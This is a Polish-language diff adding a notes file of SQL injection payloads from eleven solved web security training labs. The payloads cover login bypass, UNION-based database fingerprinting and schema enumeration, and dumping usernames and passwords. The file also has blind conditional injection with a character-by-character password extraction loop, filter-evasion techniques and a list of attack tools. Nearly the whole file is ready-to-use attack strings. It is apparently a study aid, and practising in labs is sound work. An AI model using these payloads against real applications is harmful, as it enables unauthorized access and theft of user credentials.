@@ -1,0 +1,317 @@
+ŁADUNKI Z ROZWIĄZANYCH ZADAŃ - WSTRZYKNIĘCIE SQL
+====================================================
+
+Data utworzenia: 2025-12-13
+Status: Rozwiązane laboratoria z ataków typu SQL injection
+
+====================================================
+LABORATORIUM 1: UCZEŃ
+Luka w zabezpieczeniach typu SQL injection w klauzuli WHERE umożliwiająca pobieranie ukrytych danych
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Podstawowy atak - wyświetlenie wszystkich produktów:
+   ' OR 1=1--
+
+2. Wyświetlenie produktów z kategorii Gifts:
+   Gifts' OR 1=1--
+
+3. Wyświetlenie wszystkich produktów łącznie z ukrytymi:
+   ' OR '1'='1
+
+4. Alternatywne podejście z komentarzem:
+   ' OR 'x'='x'--
+
+Przykład zapytania SQL:
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+====================================================
+LABORATORIUM 2: UCZEŃ
+Luka w zabezpieczeniach typu SQL injection umożliwiająca ominięcie logowania
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Ominięcie hasła jako administrator:
+   Nazwa użytkownika: administrator'--
+   Hasło: (dowolne)
+
+2. Alternatywny ładunek z komentarzem:
+   administrator'/*
+
+3. Wykorzystanie OR:
+   ' OR 1=1--
+
+4. Zalogowanie jako pierwszy użytkownik:
+   admin' OR '1'='1'--
+
+Przykład zapytania SQL:
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+====================================================
+LABORATORIUM 3: PRAKTYKUJĄCY
+Atak typu SQL injection polegający na zapytaniu o typ i wersję bazy danych w systemie Oracle
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Zapytanie o wersję Oracle:
+   ' UNION SELECT banner, NULL FROM v$version--
+
+2. Pełny ładunek z dwoma kolumnami:
+   ' UNION SELECT banner, NULL FROM v$version--
+
+3. Zapytanie z trzema kolumnami:
+   ' UNION SELECT NULL, banner, NULL FROM v$version--
+
+4. Alternatywne zapytanie:
+   ' UNION SELECT version, NULL FROM v$instance--
+
+Przykład wynikowego zapytania:
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT banner, NULL FROM v$version--' AND released = 1
+
+====================================================
+LABORATORIUM 4: PRAKTYKUJĄCY
+Atak typu SQL injection polegający na zapytaniu o typ i wersję bazy danych w MySQL i Microsoft
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. MySQL - zapytanie o wersję:
+   ' UNION SELECT @@version, NULL#
+
+2. Microsoft SQL Server - zapytanie o wersję:
+   ' UNION SELECT @@version, NULL--
+
+3. MySQL - alternatywne podejście:
+   ' UNION SELECT VERSION(), NULL#
+
+4. Zapytanie z wieloma kolumnami (MySQL):
+   ' UNION SELECT NULL, @@version, NULL#
+
+Uwaga: # służy jako komentarz w MySQL, -- w MSSQL
+
+====================================================
+LABORATORIUM 5: PRAKTYKUJĄCY
+Atak typu SQL injection polegający na wyświetlaniu zawartości bazy danych w bazach danych innych niż Oracle
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Wyświetlenie wszystkich tabel (MySQL/PostgreSQL):
+   ' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+2. Wyświetlenie kolumn z konkretnej tabeli:
+   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+
+3. Pobranie danych użytkowników:
+   ' UNION SELECT username, password FROM users--
+
+4. Wyświetlenie nazw tabel dla konkretnej bazy:
+   ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
+
+Przykładowa sekwencja ataków:
+a) Znalezienie tabel
+b) Znalezienie kolumn w interesującej tabeli
+c) Wyciągnięcie danych z tabeli
+
+====================================================
+LABORATORIUM 6: PRAKTYKUJĄCY
+Atak typu SQL injection, polegający na wyświetlaniu zawartości bazy danych Oracle
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Wyświetlenie wszystkich tabel:
+   ' UNION SELECT table_name, NULL FROM all_tables--
+
+2. Wyświetlenie kolumn z konkretnej tabeli:
+   ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--
+
+Uwaga: W Oracle nazwy tabel są WIELKIMI LITERAMI
+
+3. Pobranie danych użytkowników:
+   ' UNION SELECT username, password FROM users--
+
+4. Wyświetlenie tabel należących do aktualnego użytkownika:
+   ' UNION SELECT table_name, NULL FROM user_tables--
+
+====================================================
+LABORATORIUM 7: PRAKTYKUJĄCY
+Atak typu SQL injection UNION, polegający na określeniu liczby kolumn zwróconych przez zapytanie
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Test z jedną kolumną NULL:
+   ' UNION SELECT NULL--
+
+2. Test z dwoma kolumnami NULL:
+   ' UNION SELECT NULL, NULL--
+
+3. Test z trzema kolumnami NULL:
+   ' UNION SELECT NULL, NULL, NULL--
+
+4. Test z czterema kolumnami NULL:
+   ' UNION SELECT NULL, NULL, NULL, NULL--
+
+Alternatywna metoda - ORDER BY:
+   ' ORDER BY 1--
+   ' ORDER BY 2--
+   ' ORDER BY 3--
+   (kontynuuj aż wystąpi błąd)
+
+Uwaga: Liczba kolumn w UNION musi być równa liczbie kolumn w oryginalnym zapytaniu
+
+====================================================
+LABORATORIUM 8: PRAKTYKUJĄCY
+Atak SQL injection UNION, znalezienie kolumny zawierającej tekst
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Test kolumny tekstowej (zakładając 3 kolumny):
+   ' UNION SELECT 'abc', NULL, NULL--
+   ' UNION SELECT NULL, 'abc', NULL--
+   ' UNION SELECT NULL, NULL, 'abc'--
+
+2. Po znalezieniu kolumny tekstowej - wstawienie widocznego tekstu:
+   ' UNION SELECT NULL, 'tekst', NULL--
+
+3. Wstawienie specyficznego ciągu znaków:
+   ' UNION SELECT NULL, 'xyz123', NULL--
+
+4. Test z wieloma kolumnami tekstowymi:
+   ' UNION SELECT 'a', 'b', 'c'--
+
+Uwaga: Nie wszystkie kolumny przyjmują dane tekstowe (VARCHAR/TEXT)
+
+====================================================
+LABORATORIUM 9: PRAKTYKUJĄCY
+Atak typu SQL injection UNION, pobieranie danych z innych tabel
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Pobranie danych z tabeli users (zakładając 2 kolumny):
+   ' UNION SELECT username, password FROM users--
+
+2. Pobranie wszystkich użytkowników i haseł:
+   ' UNION SELECT NULL, username || ':' || password FROM users--
+
+3. Konkatenacja danych w jednej kolumnie (Oracle):
+   ' UNION SELECT NULL, username || '~' || password FROM users--
+
+4. Konkatenacja danych (MySQL):
+   ' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
+
+5. Pobranie konkretnego użytkownika:
+   ' UNION SELECT username, password FROM users WHERE username='administrator'--
+
+====================================================
+LABORATORIUM 10: PRAKTYKUJĄCY
+Atak SQL injection UNION, pobieranie wielu wartości w jednej kolumnie
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Konkatenacja danych (Oracle):
+   ' UNION SELECT NULL, username || ':' || password FROM users--
+
+2. Konkatenacja danych (MySQL/PostgreSQL):
+   ' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
+
+3. Konkatenacja danych (Microsoft SQL Server):
+   ' UNION SELECT NULL, username + ':' + password FROM users--
+
+4. Konkatenacja z separatorem (PostgreSQL):
+   ' UNION SELECT NULL, username || '~' || password FROM users--
+
+5. Wyświetlenie wielu pól w jednej kolumnie:
+   ' UNION SELECT NULL, CONCAT(username, ' - ', email, ' - ', password) FROM users--
+
+====================================================
+LABORATORIUM 11: PRAKTYKUJĄCY
+Ślepa iniekcja SQL z odpowiedziami warunkowymi
+Status: Rozwiązany
+
+Ładunki:
+--------
+1. Test podstawowy - sprawdzenie czy tabela users istnieje:
+   ' AND (SELECT 'a' FROM users LIMIT 1)='a'--
+
+2. Sprawdzenie czy użytkownik administrator istnieje:
+   ' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
+
+3. Określenie długości hasła:
+   ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
+   ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--
+
+4. Wyodrębnienie pojedynczego znaku hasła (pozycja 1):
+   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b'--
+   (testuj wszystkie znaki)
+
+5. Oracle - funkcja SUBSTR:
+   ' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'--
+
+6. Pełny atak - wydobycie hasła znak po znaku:
+   For pozycja = 1 to długość_hasła:
+       For znak in 'abcdefghijklmnopqrstuvwxyz0123456789':
+           Test: ' AND (SELECT SUBSTR(password,pozycja,1) FROM users WHERE username='administrator')='znak'--
+
+Uwaga: To metoda czasochłonna, najlepiej zautomatyzować przy użyciu skryptu
+
+====================================================
+
+DODATKOWE NOTATKI:
+==================
+
+Techniki obejścia filtrów:
+-------------------------
+1. Użycie komentarzy:
+   - MySQL: #, -- , /**/
+   - Oracle: --
+   - MSSQL: -- , /**/
+
+2. Kodowanie:
+   - URL encoding: %27 (apostrof), %20 (spacja)
+   - Unicode: \u0027 (apostrof)
+
+3. Wielkość liter:
+   - UnIoN SeLeCt
+   - OR, oR, Or
+
+4. Białe znaki:
+   - Tabulator zamiast spacji
+   - Wielokrotne spacje
+
+5. Obejście znaków specjalnych:
+   - Podwójny apostrof: ''
+   - Kodowanie hex: 0x61646d696e (admin)
+
+Wykrywanie typu bazy danych:
+----------------------------
+1. Oracle: ' UNION SELECT banner FROM v$version--
+2. MySQL: ' UNION SELECT @@version--
+3. MSSQL: ' UNION SELECT @@version--
+4. PostgreSQL: ' UNION SELECT version()--
+
+Funkcje konkatenacji:
+--------------------
+1. Oracle: 'a' || 'b'
+2. MySQL: CONCAT('a','b')
+3. MSSQL: 'a' + 'b'
+4. PostgreSQL: 'a' || 'b'
+
+Narzędzia wspomagające:
+----------------------
+1. SQLMap - automatyczne wykrywanie i eksploitacja SQL injection
+2. Burp Suite - manual testing i automatyzacja
+3. OWASP ZAP - skanowanie podatności
+4. Havij - automatyczne SQL injection tool
+
+====================================================
+KONIEC DOKUMENTU
+====================================================
